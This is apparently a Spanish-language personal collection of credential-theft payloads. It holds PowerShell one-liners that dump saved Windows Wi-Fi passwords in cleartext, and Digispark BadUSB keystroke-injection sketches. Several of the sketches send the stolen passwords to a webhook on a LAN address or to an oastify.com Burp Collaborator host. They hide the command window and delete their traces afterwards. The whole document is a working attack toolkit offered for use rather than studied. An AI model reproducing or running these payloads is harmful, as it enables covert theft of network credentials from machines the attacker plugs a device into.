>Aquí voy a enchufar todos los oneliners y scripts
-------
- Primer oneliner: **saca todas las passwds almacenadas al archivo wifi_keys**
```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {netsh wlan show profile name="$($_.Matches.Groups[1].Value.Trim())" key=clear} > wifi_keys.txt
```

- Lo mismo que arriba pero con un **script .ps1**
```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name=$_.Matches.Groups[1].Value.Trim()
    netsh wlan show profile name="$name" key=clear
} > wifi_keys.txt
```

## Script de **webhook**
```C
/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/
#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://192.168.1.136:8087 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);  
  //DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
```

## Manda passwords a server en python o burp - 17 segundos
```C
/*
  Following payload will grab saved Wifi password and will send them to your external server or Burp collaborator.
*/
#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(50);
  DigiKeyboard.println("cmd"); //Ventana cmd lo más pequeña posible --> cmd /k mode con: cols=15 lines=1
  DigiKeyboard.delay(350);
  DigiKeyboard.println("cd %temp% & netsh wlan export profile key=clear & powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > text.txt"); //exportar claves a xml, pasar a txt y luego a un external server 
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri http://sxtvq30nmjpq6pryh3wvtjv4ovumic61.oastify.com -Method POST -InFile text.txt"); //Submitting all passwords on Burp
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri \"http://192.168.1.136:8000/?data=$(Get-Content text.txt -Raw)\""); //Passwds for your external server
  DigiKeyboard.delay(50);
  DigiKeyboard.println("del Wi-Fi-* text.txt /f /q"); //cleaning up all the mess
  DigiKeyboard.println("exit");
}

void loop() {
  
}

```

## Saca un txt con las passswds y las elimina rápidamente (echarle foto) - 14 segundos
```C
/*
  Este payload saca un txt de las passwds de redes wifi , échale una foto rápido o tendrás que volver a enchufar el digispark
*/
#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(50);
  DigiKeyboard.println("cmd"); //Ventana cmd lo más pequeña posible --> cmd /k mode con: cols=15 lines=1
  DigiKeyboard.delay(350);
  DigiKeyboard.println("cd %temp% & netsh wlan export profile key=clear & powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > text.txt & notepad text.txt"); //exportar claves a xml, pasar a tx y échale una foto a esto anda
  DigiKeyboard.delay(3500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //Cierro ventana
  //DigiKeyboard.sendKeyStroke(KEY_ENTER); //Importante, esto en algunos casos lo necesito
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // a veces se necesita y a veces no
  DigiKeyboard.delay(25);
  DigiKeyboard.println("del Wi-Fi-* text.txt /f /q"); //cleaning up all the mess
  DigiKeyboard.println("exit");
}

void loop () {
}
```